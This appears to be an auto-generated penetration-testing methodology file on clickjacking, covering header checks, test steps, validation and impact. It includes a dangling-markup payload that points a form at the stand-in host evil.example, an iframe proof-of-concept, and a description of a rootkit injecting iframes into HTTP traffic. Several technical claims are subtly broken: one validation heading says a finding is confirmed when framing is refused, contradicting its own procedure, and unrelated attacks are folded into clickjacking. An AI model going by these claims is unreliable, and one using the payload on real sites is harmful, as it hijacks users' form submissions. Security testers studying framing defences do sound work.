# Methodology — Clickjacking / UI Redressing

> Derived from 9 verified items. Regenerate with `python -m wks.methodgen --class clickjacking --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** A foreign page can frame and overlay the target so the user's click means something they did not intend.

**References.** CWE-1021 · A05:2021

## 1. Preconditions

_Nothing below is reachable until these hold. Confirm each against the target before spending time on the technique._

**A web endpoint is clickjacking-exposed only when its responses carry neither an X-Frame-Options header nor a CSP frame-ancestors directive on every state-changing route.**

Probe: send `GET /target HTTP/1.1` with `Host: <victim>` and `Cookie: session=<valid>`, then read the response header block. Absence of `X-Frame-Options` AND absence of `frame-ancestors` inside the `Content-Security-Policy` header is the precondition for framing; Cloudflare's own Pages documentation treats X-Frame-Options as the control that stops an application being embedded in an iframe, and GitHub's platform-security writeup states that frame-ancestors is the directive that mitigates clickjacking and framing attacks. Test the ERROR path and the POST target separately: a redirect or a 4xx that drops the header while the 200 keeps it means the endpoint is only partly covered, and an attacker only needs the uncovered one. Differential: compare the header set on an authenticated 200 against the same route unauthenticated. A header that only appears on the authenticated response (or only on the static shell) changes the verdict.

- *Disproof:* If ANY response on the state-changing route returns a valid `X-Frame-Options: DENY`/`SAMEORIGIN` or a `Content-Security-Policy` containing `frame-ancestors`, the endpoint is not frameable and this claim is false for it. A 200 with either header present, observed on a raw request with no browser involved, disproves it.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 2. Reconnaissance signals

_What to look for while mapping the surface, and where each signal tells you the rest of the procedure is worth running._

**A response carrying X-Frame-Options but no CSP frame-ancestors is a weak-mitigation signal, not a finding: legacy X-Frame-Options cannot express per-path allowlists and is ignored when frame-ancestors is present.**

Read the raw header block and classify it into three buckets rather than pass/fail. Bucket A: no X-Frame-Options and no frame-ancestors = exposed. Bucket B: X-Frame-Options: SAMEORIGIN (or DENY) with no frame-ancestors = legacy-only. Bucket C: both present = modern, and the stricter wins per RFC/CSP precedence in supporting browsers. GitHub is the worked example of why the two are not interchangeable in practice: because frame-ancestors lacked broad browser support, GitHub set BOTH the frame-ancestors directive and the X-FRAME-OPTIONS header in all responses. Cloudflare's Pages hardening example ships the same pair together, `Content-Security-Policy: script-src 'self'; frame-ancestors 'none';` alongside X-Frame-Options. So for a hunter, a lone X-Frame-Options is the SIGNAL worth recording, and the disambiguating test is browser-side: load the target in an iframe from a different origin and observe whether the frame renders or is refused.

- *Disproof:* If a raw request to the endpoint returns a `Content-Security-Policy` header whose directives include `frame-ancestors` (any value), the response is already in bucket C and the 'legacy-only' signal does not apply. Equally, if a cross-origin iframe load of the endpoint is refused by a current browser, the practical exposure is nil regardless of which headers are present, and the signal is a false lead.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 3. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**A click-redress that does not need a full overlay works by leaving an HTML tag unclosed, so the victim's click on the visible control is parsed as a submit of an attacker-controlled form.**

The payload shape is an unclosed attribute or CDATA-bearing tag, not an invisible iframe. Reproduce: `GET /comments?q=%3Cform+action%3D%22https%3A%2F%2Fevil.example%2F%22%3E%3Cbutton%3EClick%3C%2Fbutton%3E%3Ctextarea+name%3D%27` on any endpoint that reflects a path or query into an error or comment page. The response HTML then shows an unclosed `name='`; the parser treats the next real `<form>` as nested inside the injected one, and browsers prefer the topmost form element, so the victim's click submits to the attacker's action. GitHub's post-CSP writeup documents this exact bypass of a dangling-markup mitigation, and frames it as: combining a `<textarea>` tag with an unclosed attribute bypasses the protection. Google's guidance supplies the precondition that makes the reflection dangerous: error pages commonly include the path component in the rendered HTML, so the injection lands in the page rather than being escaped. Confirm by parsing the returned HTML, not by eyeballing: does the injected form element end up as an ancestor of the page's real form? If yes, the click is redirected.

- *Disproof:* If the returned HTML has the injected attribute and tag balanced by the application's own sanitiser, so that no injected element becomes an ancestor of the page's real form, the technique does not work. Concretely: replay the payload and confirm the attacker `action` is not an ancestor-form target and that clicking the visible control submits to the application's own endpoint, with no request to the attacker's host.
- *Evidence:* high_confidence — [github.blog](https://github.blog/engineering/platform-security/githubs-post-csp-journey/); [security.googleblog.com](https://security.googleblog.com/2011/05/website-security-for-webmasters.html)

**Click-redress at scale is delivered by injecting a framed or scripted payload into HTTP responses in transit, so the framing decision is made by the victim's browser against attacker-chosen bytes.**

Two observable halves. First, the delivery: the payload reaches the victim's browser because something in the response path writes an iframe or script reference into the traffic. CrowdStrike's Linux rootkit analysis describes the mechanism concretely - it inline hooks `tcp_sendmsg` to inject the iframes (or JavaScript code references) into the HTTP traffic, and the C2 response carries the code to be injected. Second, the population: Google's anti-malware team reported identifying web pages that infect vulnerable hosts via drive-by downloads, having investigated billions of URLs and found more than three million unique URLs across over 180,000 sites, so a single confirmed injection mechanism has enormous reach. Hunt: capture the response for a victim page and check whether a foreign-origin `<iframe>` or `<script src>` appears in a body the application did not generate, and whether the page's own X-Frame-Options / frame-ancestors would have blocked framing had the payload not been injected inline. The click-redress completes only if a human clicks; the delivery half alone is the finding.

- *Disproof:* If the responses served to the victim contain no attacker-controlled iframe or script reference - verified by diffing the served HTML against the application's own template output across repeated fetches, with no variance - then nothing was injected in transit and this technique is not in play. A 200 whose body hash is stable and contains only same-origin subresources disproves it.
- *Evidence:* high_confidence — [crowdstrike.com](https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/); [security.googleblog.com](https://security.googleblog.com/2008/02/all-your-iframe-are-point-to-us.html)

**Framing a login, password-reset or payment-confirmation page is the clickjacking case that causes loss, because the frame-buster, frame-ancestors and SameSite defences are built for embedded-page redress and the real impact comes from the user's action completing inside the active session.**

The three named defences are all aimed at the embedded-page case: preventing the browser from loading the page in frame using the X-Frame-Options or Content Security Policy (frame-ancestors) HTTP headers; preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute; and implementing JavaScript in the page to attempt to prevent it being loaded in a frame, known as a frame-buster. A test that renders an innocuous page and reports the missing header is therefore low value, because the same finding on a state-changing confirmation is high value and the same absence is what makes it so. Procedure: take a page that performs a state change on a single click (password change, address update, transfer confirmation, MFA approval), render it inside a cross-origin overlay positioned over a decoy control, and confirm that a real click in the decoy region lands on the framed control while the victim's session is active. Report the framed page, not the site.

- *Disproof:* The claim is wrong, and the framing is not a clickjacking finding, if the framed page performs no state change on click (a pure read or search page); the sensitive action requires re-authentication or a second factor that cannot be satisfied by the single overlaid click; the response denies framing outright through X-Frame-Options or a frame-ancestors directive that excludes the testing origin, which makes the overlay impossible; or the frame is same-origin with the attacker page, which is a scripting bug, not UI redress. Name the state change in the report or the item is a hardening note.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html); [securelist.com](https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/)

## 4. Validation

_How to prove the finding rather than infer it. A technique that cannot be validated must not be reported._

**A clickjacking finding is validated only by a differential browser render showing a cross-origin frame actually loaded and a decoy click landing on a framed state-changing control, not by the absence of a frame-protective header.**

Header inspection tells you a defence is missing; only a render tells you the attack lands. Run the page in a real browser under a scripted cross-origin parent at controlled offsets, capture whether the framed document painted at all, and record where a click at the decoy coordinates is dispatched. Three outcomes must be distinguished: the frame refuses to load and the parent shows the Invalid frame refusal (the defence works, no finding); the frame loads but every interactive control requires re-authentication or a second factor, which caps the impact (a hardening note); the frame loads and a single click in the decoy region changes server-side state for the active session (a finding). Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth, so a page may be protected by frame-ancestors alone, by SameSite alone, or by a frame-buster alone, and each produces a different render result. Capture the network trace alongside the render so the state change is attributable to the framed request.

- *Disproof:* The validation fails, and there is no clickjacking finding, if the framed document never paints in the cross-origin parent; the parent receives a frame-busting navigation and the framed content is replaced; the click at the decoy coordinates is dispatched to the parent page rather than the frame (an overlay that is not actually over the control); the state change requires a second factor or a re-authentication step the attacker cannot supply; or replaying the framed request without a real click produces the same state change, which means the outcome was a CSRF, not UI redress. Record the click dispatch target, not just the missing header.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/clickjacking/)

**A clickjacking finding is only validated when two independent observations agree: the raw header block lacks both frame protections, and a real cross-origin iframe load of the page is refused rather than rendered.**

Step 1, headers. `GET /target HTTP/1.1` with a valid session cookie, raw socket, no rewriting. Record the presence and value of `X-Frame-Options` and of `frame-ancestors` inside `Content-Security-Policy`. Step 2, render. Serve a local page containing `<iframe src="https://victim.example/target"></iframe>` from a different origin and record whether the frame body paints. Interpret the pair: headers present AND frame refused = protected, close. Headers absent AND frame rendered = exposed, confirm. Headers absent AND frame refused = a control exists elsewhere (CSP via meta tag, a WAF, or a cookie-gated render) and the header-only finding is a false positive. Headers present AND frame rendered = the protection is malformed or scoped to a path that does not cover this route. GitHub's writeup is why both are emitted at once - frame-ancestors lacks broad support, so X-FRAME-OPTIONS is set alongside it - and Cloudflare's docs show the same pairing. A 200 header block with `frame-ancestors` present in the CSP satisfies step 1 on its own.

- *Disproof:* Disproof is any one of: a raw response on the target route that carries `X-Frame-Options` or a `Content-Security-Policy` containing `frame-ancestors`; or a cross-origin iframe load that is refused by a current browser; or a frame that renders but exposes no state-changing control, in which case there is nothing to redress and the finding does not stand.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## 5. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**This LOOKS like clickjacking (an iframe embeds an authenticated page) but is actually a benign same-origin embed, separated by the frame's document being same-origin with the embedding page.**

The false positive: a scanner or a reviewer sees `<iframe src="/app/widget">` on an authenticated page and files clickjacking. It is benign when the framed document is SAME-ORIGIN with the embedder, because the frame then enforces the same-origin policy exactly as if the content had been opened in its own window or tab - GitHub's writeup puts it that way when justifying its own frame-src policy, and still restricts framing for defence in depth rather than because same-origin framing is exploitable. The separating observation is the origin, not the presence of the iframe: fetch the framed document and compare its scheme, host and port to the embedding page's, and inspect whether the framed document can read the parent's DOM (`document.referrer`/`parent.document` reachability from the framed context). A genuine clickjacking payload MUST be cross-origin from the victim - it is served from evil.example and relies on the browser allowing the frame - so a same-origin embed fails the precondition the attack needs. CrowdStrike's Kovter writeup is the reminder that the attack's own definition is about tricking a user into clicking a control on ANOTHER page, which is a cross-origin relationship by construction. Record the verdict only after the origin comparison, never from the iframe's presence alone.

- *Disproof:* Disproof of the FP verdict: the framed document's origin differs from the embedder's (different host, or different scheme/port), or the framed document can reach into the parent document. Either observation makes the embed cross-origin and the finding real, so this is not a same-origin benign embed. Conversely, a strictly same-origin frame with no parent-DOM reach is confirmed benign.
- *Evidence:* high_confidence — [crowdstrike.com](https://www.crowdstrike.com/blog/kovter-killer-how-to-remediate-the-apt-of-clickjacking/); [github.blog](https://github.blog/engineering/platform-security/githubs-csp-journey/)

## Known bypasses

_No verified bypass items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Chaining

_No verified chain_link items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 6. Impact

_What is actually demonstrable, and what to stop claiming._

**The impact of a frameable state-changing page is that a foreign origin can force an authenticated user's action and capture a per-page token, turning one redressed click into privilege escalation.**

Two impact paths, both evidenced. Path one, forced action across origins: without CORS, a malicious site owner might be able to make requests to unsuspecting visitors' banks and initiate a transfer on their behalf - Cloudflare's documentation states this plainly. That is exactly the click-redress end state: the victim is authenticated, the origin is foreign, and the action is the victim's own. Path two, token capture: GitHub's post-CSP writeup records that CSRF tokens occur on nearly every page and the exfiltration of one can be easily leveraged to escalate privileges, so a single redressed click that leaks the token is not a nuisance issue but a privilege boundary crossing. To rate severity, determine which page was framed and what a single click on it commits: an email-change or 2FA-disable page outranks a like button. Test the impact by confirming the framed route performs a state change on POST with only the victim's ambient session, and that a token on the page is present in the response the frame can read or cause to be sent. Do not claim escalation without showing the token was actually exfiltrated; show the outbound request.

- *Disproof:* Disproof is a state-change requirement: the framed route takes no state-changing action on a single click, or requires a second factor the click alone cannot satisfy, or the token on the page is not reachable from the framed context. Also disproof: the framed response sets `SameSite` on its session cookie such that the cross-site POST carries no session at all, so there is no authenticated victim to act as. Any of these collapses the impact to nuisance.
- *Evidence:* high_confidence — [blog.cloudflare.com](https://blog.cloudflare.com/custom-headers-for-pages/); [github.blog](https://github.blog/engineering/platform-security/githubs-post-csp-journey/)

## Coverage gap

These stages have no verified evidence and are therefore absent above: Known bypasses, Chaining.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
